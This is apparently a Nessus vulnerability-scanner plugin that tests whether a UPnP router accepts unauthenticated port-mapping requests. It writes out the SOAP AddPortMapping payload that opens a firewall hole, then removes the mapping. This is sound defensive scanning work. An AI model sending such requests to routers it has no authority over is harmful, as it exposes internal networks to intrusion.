#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(35707);
 script_version("$Revision: 1.7 $");
 script_cvs_date("$Date: 2016/10/13 15:15:41 $");

 script_xref(name:"CERT", value:"361684");

 script_name(english:"UPnP Internet Gateway Device (IGD) Port Mapping Manipulation");
 script_summary(english:"Adds an IGD port mapping and removes it.");

 script_set_attribute(attribute:"synopsis", value:
"It was possible to add port redirections to the remote router.");
 script_set_attribute(attribute:"description", value:
"According to its UPnP data, the remote device is a NAT router that
supports the Internet Gateway Device (IGD) Standardized Device Control
Protocol. Nessus was able to add 'port mappings' that redirect ports
from the device's external interface to the scanner address.

An unauthenticated, remote attacker can exploit this issue (e.g., via
JavaScript or a malicious Flash animation) to open holes in the
device's firewall. An unauthenticated, adjacent attacker has
unrestricted access to this interface.");
 script_set_attribute(attribute:"see_also", value:"https://github.com/filetofirewall/fof");
 script_set_attribute(attribute:"see_also", value:"http://www.gnucitizen.org/blog/flash-upnp-attack-faq/");
 script_set_attribute(attribute:"see_also", value:"http://en.wikipedia.org/wiki/Internet_Gateway_Device_Protocol");
 script_set_attribute(attribute:"solution", value:
"Disable IGD or restrict access to trusted networks.");
 script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss3_base_vector("CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");

 script_set_attribute(attribute:"vuln_publication_date", value: "2008/01/14");
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/02/19");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english: "Misc.");

 script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

 script_dependencie("upnp_www_server.nasl");
 script_require_keys("upnp/www");

 exit(0);
}

include('global_settings.inc');
include('misc_func.inc');
include('audit.inc');
include('http.inc');

port = get_kb_item_or_exit('upnp/www');
location = get_kb_item_or_exit('upnp/'+port+'/location');
services = get_kb_list('upnp/'+port+'/service');

vuln = FALSE;
foreach(service in services)
{
  serviceType = get_kb_item_or_exit('upnp/'+port+'/service/'+service+'/serviceType');
  if (isnull(serviceType) ||
      ("WANIPConnection" >!< serviceType && "WANPPPConnection" >!< serviceType)) continue;

  ctrlUrl = get_kb_item('upnp/'+port+'/service/'+service+'/controlURL');
  if (isnull(ctrlUrl)) continue;

  # create the payload to create the port mapping. We put in a fairly short
  # lease in case our remove logic fails for whatever reason.
  testport = rand() % 32768 + 32768;
  payload = '<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
    '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
    '<s:Body>' +
    '<u:AddPortMapping xmlns:u="' + service + '">' +
    '<NewRemoteHost></NewRemoteHost>' +
    '<NewExternalPort>' + testport + '</NewExternalPort>' +
    '<NewProtocol>UDP</NewProtocol>' +
    '<NewInternalPort>' + testport + '</NewInternalPort>' +
    '<NewInternalClient>' + this_host() + '</NewInternalClient>' +
    '<NewEnabled>1</NewEnabled>' +
    '<NewPortMappingDescription>Created by Nessus</NewPortMappingDescription>' +
    '<NewLeaseDuration>60</NewLeaseDuration>' +
    '</u:AddPortMapping>' +
    '</s:Body>' +
    '</s:Envelope>';

  soapAction = ('"' + service + '#' + 'AddPortMapping' + '"');
  resp = http_send_recv3(method: 'POST',
                         item: ctrlUrl,
                         port: port,
                         content_type: 'text/xml;charset="utf-8"',
                         add_headers:make_array('SOAPAction', soapAction),
                         data: payload,
                         host: get_host_ip(),
                         exit_on_fail: FALSE);

  if (isnull(resp) || '200 OK' >!< resp[0]) continue;

  # remove the port mapping we've created even though the lease
  # should time it out shortly
  payload = '<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
    '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
    '<s:Body>' +
    '<u:DeletePortMapping xmlns:u="' + service + '">' +
    '<NewRemoteHost></NewRemoteHost>' +
    '<NewExternalPort>' + testport + '</NewExternalPort>' +
    '<NewProtocol>UDP</NewProtocol>' +
    '</u:DeletePortMapping>' +
    '</s:Body>' +
    '</s:Envelope>';

  soapAction = ('"' + service + '#' + 'DeletePortMapping' + '"');
  http_send_recv3(method: 'POST',
                  item: ctrlUrl,
                  port: port,
                  content_type: 'text/xml;charset="utf-8"',
                  add_headers: make_array('SOAPAction', soapAction),
                  data: payload,
                  host: get_host_ip(),
                  exit_on_fail: FALSE);

  vuln = TRUE;
  full_url = 'http://' + get_host_ip() + ':' + port + ctrlUrl;
  report = '\nThe remote device allowed Nessus to set a port mapping via an\n' +
           'AddPortMapping request to ' + full_url + '\n';
  security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
}

if (!vuln) exit(0, 'The server at ' + location + ' is not affected.');
